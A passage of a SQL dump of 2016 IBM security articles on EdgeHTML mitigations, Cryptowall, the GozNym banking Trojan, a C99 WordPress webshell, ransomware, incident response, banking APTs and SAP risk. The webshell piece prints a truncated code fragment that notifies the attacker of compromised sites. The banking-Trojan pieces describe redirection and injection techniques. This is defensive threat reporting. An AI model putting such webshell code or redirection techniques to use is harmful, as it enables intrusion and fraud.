corruption vulnerabilities are   that were previously   against MSHTML  .\n In the initial release of EdgeHTML, 80 new DOM object types were found. The methods and properties of these new DOM object types represent new code or code paths that can be remotely reached by an attacker. It is expected that new DOM object types, methods and properties will be added as new functionalities need to be exposed to developers via the DOM API. An interesting feature of EdgeHTML that was   is that it renders PDF files using the built-in WinRT PDF Renderer library in Windows by default: From an attacker’s perspective, complex renderers such as the WinRT PDF Renderer and Adobe Flash Player, which are both used by EdgeHTML, provide another attack surface and set of   that can be leveraged. Additionally, the functionalities of these complex renderers can potentially be repurposed to bypass exploit mitigations. Finally, the notable rendering engine attack surface reduction I noticed in my research was the removal of support for WMF and EMF images, EOT fonts and binary behaviors (which includes VML). The code that handles these file types or functionalities   of remotely exploitable vulnerabilities that were   by zero-day exploits. In addition to attack surface reduction in the rendering engine, a lack of support for a number of   further contributes to the overall attack surface reduction in Edge. To successfully exploit vulnerabilities in EdgeHTML or any of its dependencies, an attacker would need to bypass a number of exploit mitigations. There are exploit mitigations applied to the Edge content process where EdgeHTML and its dependencies are hosted, and there are also additional mitigations applied to EdgeHTML and its dependencies. Figure 1 above lists these exploit mitigations. The Edge content process, by default, runs 64-bit and has ASLR (with High Entropy and Force ASLR) and DEP enabled. The combination of these exploit mitigations increases the difficulty of exploiting memory corruption vulnerabilities, requiring the attacker to perform precise heap grooming and leaking the contents of memory that are needed in the later stages of an exploit. Assuming that an exploit against the Edge content process is successful, another mitigation called   limits what the payload can do and access. The attacker would have to exploit another vulnerability in a privileged process or the kernel to escape the AppContainer sandbox to gain higher privileges and achieve persistence. EdgeHTML and its dependencies are also compiled with   and   enabled. /GS is a well-known mitigation against stack-based buffer overflows. CFG, on the other hand, is a newer mitigation that attempts to detect abnormal control flow, which can occur when an exploit is attempting to execute return-oriented programming (ROP) gadgets. With CFG enabled, an attacker would need to find a way to control the execution flow of the target process without triggering the CFG checks. Finally, there are mitigations specific to EdgeHTML. The first is Virtual Table Guard (VTGuard), which attempts to detect an invalid virtual function table that can occur if an exploit is trying to control execution flow via a controlled C++ object in memory. The second mitigation is  . With MemGC, a number of use-after-frees that were previously exploitable became unexploitable. MemGC achieves this via a garbage collection mechanism that only frees an object’s memory chunk when no references to it are found in the registers, stack and MemGC heap. With all these mitigations in place, finding exploitable vulnerabilities and reliably exploiting them becomes more difficult and, thus, more costly. Since its initial release, Microsoft continues to add   in Edge. As new features and Web standards are  , we can expect the attack surface of the EdgeHTML rendering engine to expand. This expansion in attack surface, however, is balanced by the comprehensive exploit mitigations. They make a number of vulnerabilities in EdgeHTML and its dependencies unexploitable or very difficult and costly to exploit. For more information on my research of EdgeHTML’s attack surface and exploit mitigations, please refer to my   and  .', '\'IBM X-Force Research\', \'Microsoft\', \'Microsoft Edge\', \'Vulnerability\', \'Windows\', \'Windows 10\', \'X-Force\'', 'https://securityintelligence.com/understanding-edgehtmls-attack-surface-and-exploit-mitigations/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (263, 'The Secret Keys to Cryptowall’s Success', 'David Strom', '2016-4-26', 'A new report by Imperva titled “ ” took apart the code used in Cryptowall, showing how it works and why it has been so successful. As the authors stated, by understanding the malware’s mechanics, users can be better prepared to defend against it and other ransomware attacks. The analysts looked at version three of the malware. This is perhaps the most popular in circulation, although there is a   that includes more insidious features. The malware is one of numerous   products that starts with a phishing email, in many cases containing an infected PDF file. “Cryptowall uses hidden Tor services as its command-and-control servers. It uses gateways to Tor since hidden Tor services are not readily accessible through standard browsers,” the report stated. Once deposited, it will hold your hard drive data hostage until you make a specified payment to the attackers. Each victim has a link to a unique ransom page, and the attackers seemingly set different ransom values depending on the victim’s location. For example, the ransom amount for the U.S. is $700, whereas for Israel, Russia and Mexico, it’s only $500. “The malware authors clearly know average incomes and change ransom demands based on geolocation to keep the payments affordable,” the authors said. But this is one of the secrets of Cryptowall: The attackers understand marketing and global economics. The second secret is that they also understand  . If the victim doesn’t pay, the ransom doubles. Another reason why Cryptowall has worked so well is because of its construction. The malware is designed to obscure the identity of its attackers through various cloud-based proxies. On top of this, the beneficiaries receive payment in bitcoin, further masking their identities. But bitcoin does have one aspect that can be analyzed: While the identities are masked, the transactions are transparent. The researchers “were able to gather quite a lot of information through a bitcoin address provided within the ransom instructions.” They then “followed the bitcoin transactions passing through the attacker’s wallet and finally disclosed an extensive infrastructure of bitcoin wallets where the operators are profiting” from distributing their malware. Once payment is made, it arrives in one of numerous front-end bitcoin wallets. From there, the funds are transferred to other addresses in the Cryptowall payment network until they are eventually cashed out by the attackers. Indeed, the analysts were able to calculate these profits, and the value might surprise you. Just three samples of malware they collected generated more than $300,000 in ransom payments from more than 600 targets over a few weeks. Analysts claimed this is just the tip of the Cryptowall iceberg and the actual amount collected is probably much higher. Given the lure of this lucre, what can an enterprise IT manager do? Imperva offered several recommendations. First, monitor for the file names that Cryptowall uses, such as HELP_DECRYPT. Look for temporary files being created and deleted frequently from a certain computer. Security professionals should also make regular backups that are kept on a separate and  . Finally, educate your users about phishing attacks in general. While the attackers are getting better at exploiting human foibles — such as sending phony resumes in phishing emails — more end user education could help identify malicious communications.', '\'Advanced Threats\', \'CryptoWall\', \'Malware\', \'Ransomware\', \'Threat Intelligence\', \'Tor\'', 'https://securityintelligence.com/the-secret-keys-to-cryptowalls-success/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (264, 'Time Is Money: GozNym Launches Redirection Attacks in Poland', 'Limor Kessem', '2016-4-25', 'The  , a Trojan hybrid discovered by IBM X-Force in early April, isn’t wasting any time. A week after launching an aggressive attack campaign on 24 banks in North America, GozNym’s operators are spreading a new European configuration. On the list this time: corporate, SMB, investment banking and consumer accounts held with major Polish banks; one bank in Portugal; and one American bank. It gets worse. The GozNym team has apparently been hard at work: The release of the new configuration includes the launch of redirection attacks currently targeting 17 select banks in Poland and one major Portuguese bank. According to X-Force research, this configuration has one of the widest attack scopes in Poland, proving that the country has become a lucrative target for organized cybercrime. While the list of targeted entities features redirection instructions for 17 bank brands, it further includes close to 230 URLs targeting the websites of community banks and webmail service providers in Poland. Redirection attacks are successful because they bypass bank security measures by taking victims to a malicious website before they ever reach the bank’s actual site. The malicious website is a replica of the bank’s legitimate page, leaving victims unaware that they’ve been tricked. By keeping victims away from the bank’s site, the fraudster can deceive them into divulging critical authentication codes on the replica site, all without the bank knowing that the customer’s session has been compromised. Redirection attacks are most often identified with the resources and capabilities of organized cybergangs with developers on their team. There is extra setup required to pull the effort off, specifically the maintenance and updating of unique site replicas for each target. The technique first surfaced in 2014 when the Dyre gang launched it, targeting banks primarily in the U.K., U.S., Australia and  . Although   in November 2015, its methods lived on. Less than two months after Dyre disappeared, X-Force reported the   launched Dyre-like redirection attacks in the U.K. Now, three months after Dridex’s redirection efforts, the Nymaim gang has launched its own version of the redirection scheme via the GozNym hybrid’s configuration. The idea behind redirection attacks is to send the victim to an entirely different website than the legitimate online banking site. Note here that the bank’s website is not being compromised. Rather, clever attackers are creating convincing replicas of bank websites hosted on other servers, where they can then capture credentials and two-factor authentication data to take over the victim’s real account. This attack scheme allows criminals to steal user credentials in real time while they are on a malicious site, away from the protection banks offer customers. With  , the redirection capability was a major differentiator, which resulted in Dyre climbing to the top position as 2015’s most aggressive malware by attack volume before it was even one year old, according to IBM Trusteer data. Although redirection schemes have already been successfully implemented in real-world attacks by Dyre and Dridex, the team behind the GozNym hybrid built its own special scheme, designed to keep the attacks hidden from the prying eyes of security researchers. GozNym’s redirection attacks are made up of two distinct phases, with the end goals of: Let’s go over the basics of how GozNym’s developers designed its new redirection scheme. The first stage of the redirection attack is composed of two parts: initial redirection and an  . It is triggered when a victim attempts to navigate to one of the targeted banks’ URLs in GozNym’s configuration. When that happens, the Trojan immediately sends the victim the corresponding fake page. The fake page is designed to appear legitimate, carrying the bank’s URL and SSL certificate in the address bar to make sure the victims do not suspect they are on the wrong site. The attack manages to achieve this by sending empty/idle requests to the bank to keep the SSL connection alive. So far, it’s similar to other redirection schemes. But this is where the differences kick in. When the fake page is delivered to the victim’s browser, it comes covered with a blank overlay screen on top of it. The blank page is a simple CSS trick known as an empty div element, which is plastered over the entire screen. This curtain does not delete anything from the fake page’s source code; it only covers up the malicious content of the phishing page, making it look empty to prevent unintended parties such as security researchers from examining its content. The redirection, the fake page and the overlay are fetched from one out of two command-and-control (C&C) servers communicating with the GozNym malware. According to X-Force research, the server appears to be hosted in Moscow. The second stage of the redirection attack is designed to remove the overlay screen; it displays the malicious site’s content to the victim. To carry out this second step, GozNym imports external JavaScript to the fake page. The scripts manipulate the Document Object Model (DOM) — an approach that enables malware to access and change the internal data of targeted Web pages — and remove the div element from the page. In most cases the fake page looks like the bank’s login page, allowing victims to enter their username and password. After that initial fake login, the malware displays a delay screen via webinjection asking the victim to wait. While the victim is on hold, the fraudster queries the C&C server for additional webinjections to trick users to divulge further information about their accounts. This second step is communicated from a second server. Why divide the scheme to be delivered via two servers? Most likely, GozNym’s operators are intentionally making the attack’s setup trickier for researchers to figure out. The attack schemes added to the GozNym Trojan in the past few weeks makes it is clear the project is evolving quickly and becoming a serious player in the financial threat landscape. IBM X-Force expects to see increases in GozNym attacks and the expansion of redirection attacks to include a larger set of banks. Projects of this technical level are the domain of a few major cybercrime gangs active in the world. Convincing redirection attacks are a resource-intensive endeavor that require their operators to invest heavily in creating website replicas of individual targeted banks. The Nymaim gang stands out as one of very few groups with this capability. Currently, the only other known malware actively using redirection attacks is the Dridex gang. Rumors say a Neverquest faction also employs them; however, the latter has not yet been detected in the wild. The GozNym hybrid is a powerful new banking Trojan, as stealthy and persistent as the Nymaim loader while also possessing the Gozi ISFB Trojan’s ability to manipulate Web sessions and perform online banking fraud attacks. To help stop threats like GozNym, banks and service providers can use adaptive   and   with malware intelligence that provides real-time insight into fraudster techniques and capabilities. These tools are designed to address the relentless evolution of the threat landscape. Users looking to prevent malware infections on their endpoints must keep operating systems up to date at all times, update frequently used programs and delete applications they no longer use. Preventing Trojan infection includes disabling ads and avoiding susceptible sites typically used as infection hubs. Never clicking on links or attachments in unsolicited emails is also critically important. Most cases of malware infections, including GozNym’s, begin with a malware-laden spam email that lures victims into opening an attachment. If users are not expecting this communication, their best bet is to delete the email immediately and then check their accounts or contact their service provider to look into the matter. Those who frequently bank away from home are advised to never access any of their personal accounts from public computers in libraries, coffee shops or other locales offering Internet access. Conduct   sessions only on trusted devices that are protected by security solutions and limited to the use of the account owner.', '\'Advanced Threats\', \'Banking Trojan\', \'GozNym\', \'IBM X-Force Research\', \'Malware\', \'Online Banking\', \'Threat Intelligence\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/time-is-money-goznym-launches-redirection-attacks-in-poland/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (265, 'Got WordPress? PHP C99 Webshell Attacks Increasing', 'Dave McMillen', '2016-4-14', 'IBM Security is always looking for high-volume anomalies that might signify a new attack trend. One example is webshells, which are scripts (such as PHP, ASPX, etc.) that perform as a control panel graphical user interface (GUI). An attacker could utilize a webshell to gain system-level access to a vulnerable server. Over the past two months, IBM Managed Security Services (MSS) has noticed a steep increase in attackers’ attempts to push a variant of the popular C99 webshell. Although we see many attempts to push malicious PHP code on a daily basis, the increased volume of this particular webshell is startling compared to other types of webshell activity IBM MSS tracks: a 45 percent increase from February through March. According to  , relatively few antivirus vendors are catching this variant. What’s more, it’s targeting vulnerable WordPress systems, becoming yet another threat to content management systems (CMS). Webshells can be used legitimately by a system administrator to perform actions on the server, such as creating a user, reading system logs and restarting a service. Unlike a reverse shell, which requires a secondary program such as Netcat to be run on a victim’s machine, webshells require no communications socket and are simply run over HTTP. They are basically   that run from the browser. Webshells are considered post-exploitation tools. Before the webshell can be used in an attack, a vulnerability must be found on a target Web application. One way to accomplish this is by first uploading the webshell through a file upload page (e.g., a submission form on a company website) and then using a Local File Include (LFI) weakness in the application to include the webshell in one of the pages. Let’s begin with what we are seeing: There is one common URL and file name, pagat.txt, that contains an obfuscated PHP script. Attackers will purposely hide their malicious code in an effort to evade detection and assist in bypassing a Web application firewall (WAF) that may be protecting the website. The following GET request is issued for this particular variant:  . The abbreviation “wp” in the request stands for WordPress. The text file pagat.txt contains the obfuscated code below, which has been purposely truncated in this example for security reasons. This obfuscated PHP code would be passed to the eval() function only after it is deobfuscated using one of these three methods: Any of these three obfuscation methods can be used to decipher obfuscated code by simply using an online PHP decoding tool. The PHP module on the victim server will decode the obfuscated strings and execute the script. Once decoded, the script shows its intent. The examples below are purposely truncated for security reasons. First, an email is sent to XXXXX@gmail.com (actual email obfuscated) confirming the target has been compromised: mail(“ “, “$body”, “Hasil Bajakan hxxp://$web$inj\n Next, the script creates a form page on the victim’s website: Next, the attacker will call the new form from the browser. This will enable the attacker to execute shell commands on the server as well as push additional files that can be used for other nefarious actions. What is very clear is that this particular variant of the C99 webshell is focusing on WordPress CMS vulnerabilities. Our data showed a distinct upward trend in alert volume tied specifically to this C99 variant. IBM MSS detected almost 1,000 attacks utilizing this specific webshell code beginning in February 2016. Most of the time, these webshell entry points result from vulnerabilities in   (which we know often don’t undergo any security review during development) or an unpatched bug in the parent application. In fact, according to  , the largest percentage of CMS vulnerabilities are found in plugins or modules written by third parties. This specific variant is one of many being used by a mass Web defacer known as Hmei7, who reportedly   over a two-day period. Hmei7 uses backdoors with a file uploading feature and changes critical site files like index.php or configuration.php, which are essentially the keys to controlling the kingdom. Hmei7 is known to have defaced more than 154,000 websites and is currently being tracked by  . \n As of April 12, 2016, a Google search for the file name pagat.txt returned more than 32,000 results. Only nine of 68 antivirus products identify this malicious php script, according to  . Below is more information about the script: Refer to the associated   for more information. We brought this issue forward to draw attention to one of the easiest methods for attackers to achieve unauthorized access to your  . Prevention goes a long way to limiting the risk exposure. The following recommendations can help mitigate the latest variant of the C99 webshell: Additional recommendations can be found in the IBM X-Force research report “ .”', '\'Content Management System (CMS)\', \'IBM Managed Security Services (MSS)\', \'Security Research\', \'Shellcode\', \'Vulnerability\', \'WordPress\'', 'https://securityintelligence.com/got-wordpress-php-c99-webshell-attacks-increasing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (266, 'Meet GozNym: The Banking Malware Offspring of Gozi ISFB and Nymaim', 'Limor Kessem', '2016-4-14', 'IBM X-Force Research uncovered a Trojan hybrid spawned from the   and   ISFB malware. It appears that the operators of Nymaim have recompiled its source code with part of the   source code, creating a combination that is being actively used in attacks against more than 24 U.S. and Canadian banks, stealing millions of dollars so far. X-Force named this new hybrid GozNym. The new GozNym hybrid takes the best of both the Nymaim and Gozi ISFB malware to create a powerful Trojan. From the Nymaim malware, it leverages the dropper’s stealth and persistence; the Gozi ISFB parts add the banking Trojan’s capabilities to facilitate fraud via infected Internet browsers. The end result is a new banking Trojan in the wild. Internally, GozNym works like a double-headed beast, where the two codes rely on one another to carry out the malware’s internal operations. More information about the hybrid’s intertwined operation appears in the technical section of this blog. In terms of its current targets, X-Force noted that the GozNym hybrid’s configuration is presently focused on the U.S., targeting 22 banks, credit unions and popular e-commerce platforms. Two financial institutions based in Canada are also on the list. GozNym’s operators’ top target is business accounts. How was this hybrid created? GozNym’s source code is composed of two known malware codes, one of which is Gozi ISFB, which  . Gozi ISFB was actually leaked more than once: A second disclosure took place in late 2015, when a modified ISFB code was rumored to have been compromised yet again. On the Nymaim side, the only group known to possess its source code is the original development team. The most likely scenario is that the Nymaim team obtained the leaked Gozi ISFB code and successfully incorporated it into their own malware to create a combination Trojan for financial fraud attacks. Nymaim is a two-stage malware dropper. It usually infiltrates computers through exploit kits and then executes the second stage of its payload once it is on the machine, effectively using two executables for the infection routine. On its own, the Nymaim Trojan is a stealthy, persistent dropper that uses evasion techniques such as encryption, anti-VM, anti-debugging and control flow obfuscation. Although it has dabbled with other banking Trojans in the past, its first tight connection with banking malware began in November 2015; up until then, Nymaim was almost exclusively used as a ransomware dropper. Nymaim is believed to be operated by a closed group and developed on an ongoing basis by what appears to be the same developer(s). The Trojan has a global reach and launched an untold number of ransomware attacks using its own generic locker on users in Europe, North America and South America,   reported. Campaigns linked with the malware were not all documented. However, related   cited over 2.5 million infections via the Blackhole Exploit Kit (BHEK) in late 2013. \n X-Force researchers noticed that Nymaim started fetching a Gozi ISFB module, a webinjection dynamic link library (DLL), and using it to launch online banking attacks in late 2015. As for the infection vector, some recent cases from 2016 revealed that the Pony loader executed Nymaim, which then fetched Gozi ISFB as a third step in the infection flow. The resulting online   were detected as Gozi ISFB attacks, even though they originated with Nymaim. The  , was detected in early April 2016, when new Nymaim samples came embedded with Gozi ISFB code and were recompiled into one malware. In the hybrid form, Nymaim is the first executable launched. It then launches the Gozi ISFB component as the second stage of the malware deployment. Before merging into an actual hybrid, earlier versions of Nymaim used to fetch and inject Gozi ISFB’s financial module as a complete DLL into the infected victim’s browser to enable webinjections on online banking sites. That DLL is about 150 KB and was a valid Portable Executable (PE) file. More recent versions of Nymaim include altered Gozi ISFB code. Instead of the 150 KB DLL, it now injects a 40 KB buffer into the browser. This buffer still performs Gozi ISFB’s functionality. For example, when it comes to the Export Address Table (EAT), which contains the addresses of modules exposed for consumption by other applications and services, GozNym uses the same hook engine to perform webinjections. However, there are some pointed differences. For one, the new buffer is not a valid PE file — it has more of a shellcode structure. It constructs its own Import Address Table (IAT) and has no PE headers. Another difference is that the new buffer is intertwined with Nymaim’s code. We have at least two examples that demonstrate that interoperability: One is where Gozi ISFB calls Nymaim code to obtain strings; the other is where Gozi ISFB’s buffer code needs to perform actions such as memory allocations. This intertwined construction led us to the conclusion that Nymaim and Gozi ISFB were in fact compiled into one project. To illustrate that, let’s have a look at a comparison between the earlier Gozi ISFB DLL version and the new GozNym buffer code. Both pieces perform the same essential action and are taken from the ISFB hook engine. Here is the original Gozi ISFB DLL that used to be fetched by Nymaim: Here is the new GozNym buffer: In this last figure, we see the new hybrid version’s function jmp_nymaim_code: This piece of code is called whenever Gozi ISFB requires Nymaim to perform an operation. In our example, it is calling HeapAlloc. The function prepares the required arguments, operation type, allocation size, etc. for Nymaim. Nymaim then performs the action and returns the result to the Gozi ISFB code. The MD5 hash is 2A9093307E667CDB71884ECC1B480245. The merging of Nymaim and parts of Gozi ISFB has resulted in a new banking Trojan in the wild. This malware is as stealthy and persistent as the Nymaim loader while possessing the Gozi ISFB Trojan’s ability to manipulate Web sessions, resulting in advanced online banking fraud attacks. IBM Security has studied the GozNym malware and its attack schemes and can help banks and other targeted organizations learn more about this high-risk threat. To help stop threats like GozNym, banks and service providers can use adaptive   and   with malware intelligence that provides real-time insight into fraudster techniques and capabilities, designed to address the relentless evolution of the threat landscape.', '\'Banking Trojan\', \'Blackhole Exploit Kit (BHEK)\', \'Fraud\', \'Gozi\', \'Gozi Trojan\', \'GozNym\', \'IBM X-Force Research\', \'Nymaim\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/meet-goznym-the-banking-malware-offspring-of-gozi-isfb-and-nymaim/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (267, 'Ransomware Attacks Will Not Stop Anytime Soon', 'Ayoub Bahar', '2016-4-13', 'Ransomware, one of the most popular current attack vectors, occurs when an attacker uses malware to encrypt data and then asks for money to decrypt it. This attack type doesn’t seem to be slowing down; in fact, it’s expected to gain more popularity this year, according to  . The FBI said it received more than   about ransomware last year, costing the victims over $25 million dollars. CryptoWall, TeslaCrypt and Locky are the most popular versions of this malware, and to date, the safest way to get your data back is by paying ransoms. PhishMe projected   in the upcoming weeks since it is a promising and easy market for cybercriminals all over the world. That’s because users are still extremely susceptible to phishing attacks, pop-ups and malicious links, pictures and flash banners. Users are often clicking without paying attention or without knowing the link’s source and destination. Many software companies advertise solutions for ransomware, but the success rate is not totally satisfying. These solutions often work by maintaining a huge database of digital signatures of known viruses. When a scanned file matches a known malware, it will be quarantined and deleted. This approach can protect your computer against well-known malware but won’t help when a virus is too new to be stored in the digital signatures database. Not only that, but some ransomware encrypt their own source code or modify it constantly, making detection much harder for antivirus software. The   is that most types of ransomware are not self-propagating on a network, meaning that even if you got infected by clicking the wrong link or downloading the wrong file, it will only infect your computer and won’t spread to others connected to the network. To avoid infection, here are actionable ideas to start with:', '\'Advanced Threats\', \'Malware\', \'Ransomware\'', 'https://securityintelligence.com/ransomware-attacks-will-not-stop-anytime-soon/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (268, 'Enhancing Incident Response: The Role of Strategic Partners in Your Security Posture', 'Jonathan Collins', '2016-4-12', 'An organization’s strategic relationships are a key factor in establishing stronger security expertise. In the event of a computer security incident, they constitute an important factor in its resolution. In addition to providing security controls, these experts may also be the principal source for obtaining essential artifacts for investigating an incident. In today’s information-driven economy, organizations rely on service providers to fulfill a multitude of responsibilities and operational tasks. Whether it is hosting websites, managing payroll, conducting penetration tests, performing digital forensics or providing shipping logistics to get a commodity to market, almost any function within an organization necessitating information technology can be supported by a  . The reasons an organization may decide to engage a provider in lieu of performing the task in-house are varied. In some cases, a third party simply offers a more cost-effective and secure option to the alternative of ensuring all skills and IT systems are available and managed internally. Very often an organization may lack more specialized skills in a particular area, and contracting out to a third party constitutes the best possible solution. Regardless of what is contracted from a third-party provider or why, the decision presents an organization with some additional considerations when thinking about how to increase the security of its entire IT environment. This is only natural, given that the provider’s interaction with an organization’s data may be quite extensive: It could range from access to employee or customer names, addresses and other identifying information to more IT focused data such as remote login usernames, passwords and encryption keys. Reported breaches at two large retailers resulted in two of the largest data compromises in recent times. These breaches involved tactics that targeted some third-party managed systems, including successful phishing attempts and stolen credentials. Irrespective of the exact circumstances of each attack, the tactics used indicate a number of potential risks and the need for organizations to adequately address some often overlooked areas of security in their provider relationships. By working with providers to address these issues upfront, you will be able to   when time is most critical. The following are key areas that, if improved upon, can strengthen your information security, minimize potential new risks and establish a strategic relationship where a mutual concern for security is paramount. Expediently alerting the organization that the network maintained by the provider has potentially suffered a data compromise is crucial. Postponing notification rarely, if ever, stems from ill intentions; rather, providers may want to carry out a full investigation of the security incident to gather as many facts as possible before informing the client. Nevertheless, this may cause unintentional delays in the response and result, for example, in the automatic overwriting of valuable artifacts such as logs. This can negatively impact incident response and time to a speedy resolution of the problem. In addition, many organizations handling certain types of data may also be bound by regulatory considerations such as the PCI Council or national and local laws that prescribe a set time frame within which specific notifications must be made. Organizations should highlight the importance of timely notifications through various means and agreements with their provider. In this way, misunderstandings can be reduced. When an incident response team is engaged in an investigation, a litany of requests for different data quickly follows, from disk images and RAM to system and network logs and more. These artifacts are required to understand the extent of the damage and formulate an appropriate response plan. Any incident response will doubtless face significant obstacles if a provider states that the artifacts contain data from its other clients. Due to contractual and privacy obligations, the provider may not be in a position to provide this data and may be forced to spend precious time filtering the artifacts before sending the data to the  . While it is ideally avoided, the mixing or commingling of data may not be preventable in all architectures. It is therefore advisable to have an appropriate level of understanding with the provider as to this possible risk. As noted previously, an incident response team has a need for certain artifacts at the onset of an investigation. Generally, these collection tasks do not require an extensive knowledge of computer security. IBM’s incident responders, for example, are specially equipped with methods and tools to facilitate work with remote staff who may not be security experts. Nevertheless, quick and efficient collection of these artifacts does require an adequate level of IT skills on the part of the provider’s staff. The absence of skilled personnel at the provider site may hinder the ability to quickly receive the critical artifacts necessary to begin an investigation. As a result, it is important to establish a professional relationship with well-trained personnel who can retrieve needed artifacts and have a clear understanding of their  . This may also be bolstered by requesting that basic incident response training for certain key employees be carried out. In its many years of experience responding to incidents, reviewing and crafting incident response plans and performing mock incident tabletops and testing exercises, IBM Emergency Response Services (ERS) noted that many organizations do not incorporate the testing of a provider’s ability to fulfill its incident preparedness role into their overall incident response process. What would normally take days may take weeks if the provider’s role in the larger context of the incident response process is not tried, tested and rehearsed. The provider’s own processes will play a significant role in determining its ability to contribute to the overall incident response. By performing periodic proactive tests of systems and procedures, including those of providers, organizations can better identify improvements and request applicable changes be made by providers for the area they are supporting. This will prevent delays in the event of an incident and enhance the partnership. Numerous options exist for technical and procedural testing such as penetration tests, threat assessments, risk assessments, mock incidents and tabletops. The IBM ERS team conducts or can participate in exercises to test the ability of an organization’s providers to respond to an incident. Another way to strengthen the security relationship is to conduct reasonable and timely reviews of, and maintain adequate access to, provider systems that support operations and security. Maintaining an appropriate, mutually agreed-upon level of visibility into those operations that directly affect the organization’s information security position is highly recommended. While organizations may be very detailed when contractually defining the security specifications they require, many are less specific when it comes to agreements for   with those controls. This can be achieved by allowing for sufficient reviews of supplier services and security activities. It is unreasonable to specify contractually the right to access or audit a provider’s entire environment. The provider, for its own legitimate security needs, may not be willing to provide direct access or full audit rights. However, it is advisable to have an agreement that addresses access and audit rights for verifying adherence to information security protocols and incident preparedness specifications. A complete lack of understanding in this area can become cumbersome when there is an urgent need — such as in security incidents — to gain information from a provider’s environment. Precious time may be lost since permission must be granted for any incident response team to begin its investigation. To the extent allowable, agreements should exist between the organization and providers relating to security reviews and access rights to areas that affect incident response. As the source of much of the information that could potentially be needed during the response to an incident or in a digital forensics examination, event log generation, review, protection and storage by third-party providers should be a priority. A provider should be able to meet these needs, and there should be clear expectations as to the types of logs kept and the required time to retain those logs. In one particularly egregious case,   discovered that a client’s Internet service provider had been keeping logs for only 24 hours. Such a practice seriously inhibits incident response effectiveness and makes it very difficult to conduct any meaningful investigation. On the other hand, ensuring proper agreements with your providers as to event and system logs can result in uncovering a piece of evidence that makes for the successful conclusion of an incident. In such cases, the provider truly fulfills its strategic role as an integral part an organization’s security. Service providers are clearly an asset for delivering critical expertise to help an organization carry out its mission and business requirements. This applies to security, as well. Appropriately addressing these key areas of security in the provider relationship will greatly improve your organization’s response to a security incident. Conversely, not mitigating them can potentially slow the response to an incident. A balanced approach that includes well-defined service-level agreements outlining appropriate expectations of providers, effective incident response testing, adequate technical assessments and supplier reviews can help ensure a productive, strategic partnership that improves your organization’s overall security posture.', '\'IBM Emergency Response Services\', \'IBM X-Force Incident Response and Intelligence Services\', \'Incident Response (IR)\'', 'https://securityintelligence.com/enhancing-incident-response-the-role-of-strategic-partners-in-your-security-posture/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (269, 'Organized Cybercrime’s New Bull’s-eye: Bankers', 'Limor Kessem', '2016-4-8', 'From Anunak to GCMAN and Metel to Carbanak, it is increasingly clear that organized cybercrime groups are becoming greedier than ever, no longer interested in volume attacks on bank customers. Rather, financially motivated adversaries are investing in attacking the source of liquid cash: banks. To get into these secure environments, they target the organization’s people, its first line of defense. While bank customers are still the target for botnet-based attacks, bankers have become the top targets for organized  . Is this new? Why is it becoming an issue now? This detrimental trend has seen a significant escalation in number and scope, warranting greater awareness and new measures to bolster defense from within the organization. The financial APT trend has been growing since mid-2014, making the headlines when the   was discovered setting its sights on the financial industry. Unfortunately, awareness to this sort of threat did not generate the necessary lessons, and the financial sector saw the same attackers strike in the biggest cyberheist ever: the   case, discovered in early 2015. Four more cases have since materialized, including specialized APT groups such as Lazarus that make it their business to attack banks, among other targets. How are these attacks carried out? Is there anything special about them? In these classic APT schemes, attackers follow a familiar route, infecting the employees with malware and then moving inside the organization’s networks until they encounter their mark. The most coveted   are those that grant access to internal payment gateways and internal banking systems. However, the goal is different: Instead of stealing data or intellectual property, attackers will alter the information in internal systems or exploit it to work in their favor. While these adversaries may have the same   as other cybercriminals, they are far from being typical fraudsters. These are highly skilled attackers who can infiltrate systems with the help of both legitimate and malicious tools — but also without using any malware at all. Once they are in, the average time from the moment of penetration into the core internal networks to actual theft of money is 42 days — at least, it was in 2014. Nowadays, with experience and motivation, the reconnaissance phase is becoming shorter, and so is the active phase of the attack. These extremely targeted attacks rely on a focal entry point: employees. If you work at a bank or as part of your organization’s financial team, you are a top target for these groups and could end up as the person who inadvertently ushers them in.', '\'Advanced Persistent Threat (APT)\', \'Advanced Threats\', \'Banking\', \'Cybercrime\', \'Financial Industry\', \'Threat Intelligence\'', 'https://securityintelligence.com/organized-cybercrimes-new-bulls-eye-bankers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (270, 'Are You Really Empowered to Manage Cybersecurity Risks Affecting Your SAP Systems?', 'Charlie Singh', '2016-4-8', 'A recent independent study conducted by the Ponemon Institute, “ ,” revealed some startling information about the threat of a SAP cyber breach and how companies are managing the risk of information theft, modification of the data and disruption of business processes. To understand what makes SAP systems the perfect target for a cybercriminal, you don’t have to look far. Ask yourself: Which system runs the most business-critical processes in my company? Which system stores the most business-sensitive information? Which system is the company most dependent upon? The answer unanimously comes back to the enterprise resource planning (ERP) system your company runs. In today’s world, a majority of the Fortune 500 companies rely on SAP as their ERP system. This single ERP system has become a critical and crucial lifeline to companies across all industries, ranging from health care, utilities and oil and gas to telecom, insurance and financial services. Recent high-profile cybersecurity breaches still have not served as a wake-up call in many corporate boardrooms. Some excerpts from the Ponemon Institute’s independent study highlight some interesting perceptions about SAP cybersecurity risk. First, nearly 76 percent of respondents said their senior leadership understands the importance and criticality of SAP installations to profitability. However, 63 percent of respondents also said   underestimate the risks associated with insecure SAP applications. If SAP systems are taken offline, the expected average financial consequence for companies is $4.5 million. These costs were estimated to include direct cash outlays, direct labor expenditures, indirect labor costs, overhead costs and lost business opportunity. The majority of the respondents believe it is difficult to secure SAP systems. One possible reason is a lack of clear ownership over these systems. When asked which function was most accountable for security, 25 percent claimed that no one group was responsible. Meanwhile, 21 percent said IT infrastructure was responsible, 19 percent said a dedicated SAP security team and 18 percent said information security. Risk executives, audit professionals and boards of directors all collected less than 10 percent of the vote. When asked what was most important for achieving security, 83 percent of respondents indicated that detecting zero-day 